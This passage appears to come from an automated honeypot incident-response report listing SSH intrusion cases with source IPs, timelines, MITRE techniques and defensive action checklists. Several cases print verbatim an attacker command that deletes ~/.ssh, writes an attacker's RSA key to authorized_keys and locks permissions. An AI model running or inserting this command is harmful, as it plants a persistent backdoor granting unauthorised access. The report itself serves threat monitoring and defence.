| `2026-11-04 04:21:29` | `cowrie.session.params` |
| `2026-11-04 04:21:29` | `cowrie.command.input` |
| `2026-11-04 04:21:30` | `cowrie.session.file_download` |
| `2026-11-04 04:21:30` | `cowrie.log.closed` |
| `2026-11-04 04:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62507caf222

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]203` |
| **First Seen** | 2026-11-04 04:21 |
| **Last Seen** | 2026-11-04 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:21:30` | `cowrie.session.connect` |
| `2026-11-04 04:21:30` | `cowrie.client.version` |
| `2026-11-04 04:21:30` | `cowrie.client.kex` |
| `2026-11-04 04:21:31` | `cowrie.login.success` |
| `2026-11-04 04:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f46ee7c3a38

| Field | Detail |
|---|---|
| **Source IP** | `152.89.12[.]101` |
| **First Seen** | 2026-11-04 04:24 |
| **Last Seen** | 2026-11-04 04:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:24:01` | `cowrie.session.connect` |
| `2026-11-04 04:24:01` | `cowrie.client.version` |
| `2026-11-04 04:24:01` | `cowrie.client.kex` |
| `2026-11-04 04:24:01` | `cowrie.login.success` |
| `2026-11-04 04:24:02` | `cowrie.session.params` |
| `2026-11-04 04:24:02` | `cowrie.command.input` |
| `2026-11-04 04:24:02` | `cowrie.command.failed` |
| `2026-11-04 04:24:03` | `cowrie.log.closed` |
| `2026-11-04 04:24:03` | `cowrie.session.params` |
| `2026-11-04 04:24:03` | `cowrie.command.input` |
| `2026-11-04 04:24:04` | `cowrie.session.file_download` |
| `2026-11-04 04:24:04` | `cowrie.log.closed` |
| `2026-11-04 04:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.12[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.89.12[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31930902b0d8

| Field | Detail |
|---|---|
| **Source IP** | `152.89.12[.]101` |
| **First Seen** | 2026-11-04 04:24 |
| **Last Seen** | 2026-11-04 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:24:04` | `cowrie.session.connect` |
| `2026-11-04 04:24:04` | `cowrie.client.version` |
| `2026-11-04 04:24:04` | `cowrie.client.kex` |
| `2026-11-04 04:24:05` | `cowrie.login.success` |
| `2026-11-04 04:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.12[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.89.12[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8572e19b039d

| Field | Detail |
|---|---|
| **Source IP** | `130.61.148[.]1` |
| **First Seen** | 2026-11-04 04:26 |
| **Last Seen** | 2026-11-04 04:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:26:41` | `cowrie.session.connect` |
| `2026-11-04 04:26:41` | `cowrie.client.version` |
| `2026-11-04 04:26:41` | `cowrie.client.kex` |
| `2026-11-04 04:26:41` | `cowrie.login.success` |
| `2026-11-04 04:26:42` | `cowrie.session.params` |
| `2026-11-04 04:26:42` | `cowrie.command.input` |
| `2026-11-04 04:26:42` | `cowrie.command.failed` |
| `2026-11-04 04:26:42` | `cowrie.log.closed` |
| `2026-11-04 04:26:43` | `cowrie.session.params` |
| `2026-11-04 04:26:43` | `cowrie.command.input` |
| `2026-11-04 04:26:43` | `cowrie.session.file_download` |
| `2026-11-04 04:26:43` | `cowrie.log.closed` |
| `2026-11-04 04:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.61.148[.]1` to AbuseIPDB if not already reported
- [ ] Block `130.61.148[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e3705d99a1b

| Field | Detail |
|---|---|
| **Source IP** | `130.61.148[.]1` |
| **First Seen** | 2026-11-04 04:26 |
| **Last Seen** | 2026-11-04 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:26:43` | `cowrie.session.connect` |
| `2026-11-04 04:26:43` | `cowrie.client.version` |
| `2026-11-04 04:26:43` | `cowrie.client.kex` |
| `2026-11-04 04:26:44` | `cowrie.login.success` |
| `2026-11-04 04:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.61.148[.]1` to AbuseIPDB if not already reported
- [ ] Block `130.61.148[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4d264d5d8f

| Field | Detail |
|---|---|
| **Source IP** | `103.61.44[.]43` |
| **First Seen** | 2026-11-04 04:32 |
| **Last Seen** | 2026-11-04 04:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:32:06` | `cowrie.session.connect` |
| `2026-11-04 04:32:06` | `cowrie.client.version` |
| `2026-11-04 04:32:06` | `cowrie.client.kex` |
| `2026-11-04 04:32:07` | `cowrie.login.success` |
| `2026-11-04 04:32:08` | `cowrie.session.params` |
| `2026-11-04 04:32:08` | `cowrie.command.input` |
| `2026-11-04 04:32:08` | `cowrie.command.failed` |
| `2026-11-04 04:32:08` | `cowrie.log.closed` |
| `2026-11-04 04:32:09` | `cowrie.session.params` |
| `2026-11-04 04:32:09` | `cowrie.command.input` |
| `2026-11-04 04:32:10` | `cowrie.session.file_download` |
| `2026-11-04 04:32:10` | `cowrie.log.closed` |
| `2026-11-04 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.44[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.61.44[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd2d2f0abd9

| Field | Detail |
|---|---|
| **Source IP** | `103.61.44[.]43` |
| **First Seen** | 2026-11-04 04:32 |
| **Last Seen** | 2026-11-04 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:32:10` | `cowrie.session.connect` |
| `2026-11-04 04:32:10` | `cowrie.client.version` |
| `2026-11-04 04:32:10` | `cowrie.client.kex` |
| `2026-11-04 04:32:11` | `cowrie.login.success` |
| `2026-11-04 04:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.44[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.61.44[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ae79206981

| Field | Detail |
|---|---|
| **Source IP** | `94.20.62[.]126` |
| **First Seen** | 2026-11-04 04:34 |
| **Last Seen** | 2026-11-04 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:34:15` | `cowrie.session.connect` |
| `2026-11-04 04:34:15` | `cowrie.client.version` |
| `2026-11-04 04:34:16` | `cowrie.client.kex` |
| `2026-11-04 04:34:16` | `cowrie.login.success` |
| `2026-11-04 04:34:17` | `cowrie.session.params` |
| `2026-11-04 04:34:17` | `cowrie.command.input` |
| `2026-11-04 04:34:17` | `cowrie.command.failed` |
| `2026-11-04 04:34:17` | `cowrie.log.closed` |
| `2026-11-04 04:34:18` | `cowrie.session.params` |
| `2026-11-04 04:34:18` | `cowrie.command.input` |
| `2026-11-04 04:34:18` | `cowrie.session.file_download` |
| `2026-11-04 04:34:18` | `cowrie.log.closed` |
| `2026-11-04 04:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.20.62[.]126` to AbuseIPDB if not already reported
- [ ] Block `94.20.62[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8973abd1ae0d

| Field | Detail |
|---|---|
| **Source IP** | `94.20.62[.]126` |
| **First Seen** | 2026-11-04 04:34 |
| **Last Seen** | 2026-11-04 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:34:18` | `cowrie.session.connect` |
| `2026-11-04 04:34:18` | `cowrie.client.version` |
| `2026-11-04 04:34:19` | `cowrie.client.kex` |
| `2026-11-04 04:34:19` | `cowrie.login.success` |
| `2026-11-04 04:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.20.62[.]126` to AbuseIPDB if not already reported
- [ ] Block `94.20.62[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af528a5e58e5

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-11-04 04:36 |
| **Last Seen** | 2026-11-04 04:36 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:36:40` | `cowrie.session.connect` |
| `2026-11-04 04:36:40` | `cowrie.client.version` |
| `2026-11-04 04:36:40` | `cowrie.client.kex` |
| `2026-11-04 04:36:40` | `cowrie.login.success` |
| `2026-11-04 04:36:41` | `cowrie.session.params` |
| `2026-11-04 04:36:41` | `cowrie.command.input` |
| `2026-11-04 04:36:41` | `cowrie.command.failed` |
| `2026-11-04 04:36:41` | `cowrie.log.closed` |
| `2026-11-04 04:36:42` | `cowrie.session.params` |
| `2026-11-04 04:36:42` | `cowrie.command.input` |
| `2026-11-04 04:36:42` | `cowrie.session.file_download` |
| `2026-11-04 04:36:42` | `cowrie.log.closed` |
| `2026-11-04 04:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e187abd72993

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-11-04 04:36 |
| **Last Seen** | 2026-11-04 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:36:42` | `cowrie.session.connect` |
| `2026-11-04 04:36:42` | `cowrie.client.version` |
| `2026-11-04 04:36:42` | `cowrie.client.kex` |
| `2026-11-04 04:36:43` | `cowrie.login.success` |
| `2026-11-04 04:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464e64ab447c

| Field | Detail |
|---|---|
| **Source IP** | `72.46.87[.]211` |
| **First Seen** | 2026-11-04 04:39 |
| **Last Seen** | 2026-11-04 04:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m, cat /proc, >` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:39:07` | `cowrie.session.connect` |
| `2026-11-04 04:39:07` | `cowrie.login.success` |
| `2026-11-04 04:39:08` | `cowrie.session.params` |
| `2026-11-04 04:39:08` | `cowrie.command.input` |
| `2026-11-04 04:39:09` | `cowrie.command.input` |
| `2026-11-04 04:39:09` | `cowrie.command.input` |
| `2026-11-04 04:39:13` | `cowrie.log.closed` |
| `2026-11-04 04:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.46.87[.]211` to AbuseIPDB if not already reported
- [ ] Block `72.46.87[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (198) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-fbb521cdbb90 | HIGH | `50.6.200[.]164` | 2026-11-04 04:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-73f15b81cdd3 | HIGH | `50.6.200[.]164` | 2026-11-04 04:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8a0e0db46b97 | HIGH | `51.68.226[.]87` | 2026-11-04 04:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e32f056c0a4d | HIGH | `51.68.226[.]87` | 2026-11-04 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9bd0bbed0927 | HIGH | `129.121.136[.]149` | 2026-11-04 04:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-08ebb3106b31 | HIGH | `129.121.136[.]149` | 2026-11-04 04:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0120d629d07f | HIGH | `172.200.195[.]165` | 2026-11-04 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f0831fcc8471 | HIGH | `172.200.195[.]165` | 2026-11-04 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-86c440621d5f | HIGH | `193.32.162[.]84` | 2026-11-04 05:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9bf5b580ac88 | HIGH | `129.121.123[.]73` | 2026-11-04 05:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6371e75ee2e1 | HIGH | `129.121.123[.]73` | 2026-11-04 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89bb0f2d269c | HIGH | `35.210.85[.]137` | 2026-11-04 05:04 | Y | 2 | 0 | `T1078` |
| IR-883d649d8133 | HIGH | `35.210.85[.]137` | 2026-11-04 05:05 | Y | 1 | 0 | `T1078` |
| IR-b6276a8ba0e7 | HIGH | `35.210.85[.]137` | 2026-11-04 05:05 | Y | 0 | 0 | `T1078` |
| IR-bedf5997afbe | HIGH | `193.32.162[.]84` | 2026-11-04 05:06 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-68c6a3c33f19 | HIGH | `193.32.162[.]84` | 2026-11-04 05:08 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0988e53adb93 | HIGH | `34.81.19[.]39` | 2026-11-04 05:10 | Y | 4 | 0 | `T1078 · T1083` |
| IR-e50ec71e6016 | HIGH | `193.32.162[.]84` | 2026-11-04 05:10 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-898862141cf1 | HIGH | `193.32.162[.]84` | 2026-11-04 05:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-91ad45e2b732 | HIGH | `193.32.162[.]84` | 2026-11-04 05:14 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-12d0badaa701 | HIGH | `193.32.162[.]84` | 2026-11-04 05:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fdfd9f5b2f50 | HIGH | `193.32.162[.]84` | 2026-11-04 05:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c72e9fda6a93 | HIGH | `193.32.162[.]84` | 2026-11-04 05:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-60d4c710636e | HIGH | `193.32.162[.]84` | 2026-11-04 05:23 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b3e563ae3a2e | HIGH | `193.32.162[.]84` | 2026-11-04 05:25 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1fba1c7fed0f | HIGH | `193.32.162[.]84` | 2026-11-04 05:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-37f163c47177 | HIGH | `193.32.162[.]84` | 2026-11-04 05:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b55ea63191ef | HIGH | `193.32.162[.]84` | 2026-11-04 05:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a8a0e45a0f1f | HIGH | `193.32.162[.]84` | 2026-11-04 05:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bc2c6ade72d7 | HIGH | `35.210.138[.]136` | 2026-11-04 05:36 | Y | 2 | 0 | `T1078` |
| IR-d87093db49c9 | HIGH | `35.210.138[.]136` | 2026-11-04 05:36 | Y | 1 | 0 | `T1078` |
| IR-8d6a1ec1fd28 | HIGH | `35.210.138[.]136` | 2026-11-04 05:36 | Y | 0 | 0 | `T1078` |
| IR-74305e648dd6 | HIGH | `193.32.162[.]84` | 2026-11-04 05:37 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-af3baeb7d839 | HIGH | `193.32.162[.]84` | 2026-11-04 05:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0e8ceebb49b5 | HIGH | `193.32.162[.]84` | 2026-11-04 05:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-12e188694703 | HIGH | `193.32.162[.]84` | 2026-11-04 05:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-22714b38b257 | HIGH | `193.32.162[.]84` | 2026-11-04 05:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bae218c52eae | HIGH | `193.32.162[.]84` | 2026-11-04 05:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cca61a377c92 | HIGH | `193.32.162[.]84` | 2026-11-04 05:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2f94bc6bfedc | HIGH | `193.32.162[.]84` | 2026-11-04 05:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a5f58e98f01d | HIGH | `193.32.162[.]84` | 2026-11-04 05:51 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-178254af0f03 | HIGH | `193.32.162[.]84` | 2026-11-04 05:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9b66f16d963f | HIGH | `193.32.162[.]84` | 2026-11-04 05:55 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4c5ae22fc2db | HIGH | `193.32.162[.]84` | 2026-11-04 05:56 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-900605057724 | HIGH | `187.16.96[.]250` | 2026-11-04 05:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a18e86e74bab | HIGH | `187.16.96[.]250` | 2026-11-04 05:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a34958e2437f | HIGH | `72.46.87[.]211` | 2026-11-04 06:00 | Y | 3 | 0 | `T1078 · T1083` |
| IR-7b3df7c8c27e | HIGH | `35.206.133[.]206` | 2026-11-04 06:23 | Y | 2 | 0 | `T1078` |
| IR-426f0e8d416e | HIGH | `35.206.133[.]206` | 2026-11-04 06:23 | Y | 0 | 0 | `T1078` |
| IR-a22a3e55ca44 | HIGH | `35.206.133[.]206` | 2026-11-04 06:23 | Y | 1 | 0 | `T1078` |
| IR-1a2101d70833 | HIGH | `190.0.63[.]226` | 2026-11-04 06:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-59098a9e1d92 | HIGH | `190.0.63[.]226` | 2026-11-04 06:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-98eec9f1ef4e | HIGH | `165.245.250[.]118` | 2026-11-04 06:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-30960615511c | HIGH | `165.245.250[.]118` | 2026-11-04 06:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb16b7a63416 | HIGH | `184.105.247[.]196` | 2026-11-04 07:16 | Y | 3 | 0 | `T1078` |
| IR-51fa318f8efc | HIGH | `45.121.25[.]115` | 2026-11-04 07:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-32bea3476f92 | HIGH | `45.121.25[.]115` | 2026-11-04 07:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64ec34b2e86f | HIGH | `59.6.159[.]181` | 2026-11-04 07:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-40694375f2f3 | HIGH | `59.6.159[.]181` | 2026-11-04 07:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8937966a978e | HIGH | `78.89.154[.]59` | 2026-11-04 07:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7af238e463e7 | HIGH | `78.89.154[.]59` | 2026-11-04 07:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5dcb30db7bc4 | HIGH | `65.109.217[.]133` | 2026-11-04 07:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1db67e8aa74e | HIGH | `65.109.217[.]133` | 2026-11-04 07:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1168b742957d | HIGH | `152.32.191[.]191` | 2026-11-04 07:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c96989931061 | HIGH | `152.32.191[.]191` | 2026-11-04 07:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e74f769f5a86 | HIGH | `176.53.159[.]196` | 2026-11-04 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-00b5cc090f00 | HIGH | `103.143.231[.]24` | 2026-11-04 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-86282fe1e0bf | HIGH | `103.143.231[.]24` | 2026-11-04 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9510f97348cd | HIGH | `176.65.132[.]216` | 2026-11-04 08:03 | Y | 0 | 0 | `T1078` |
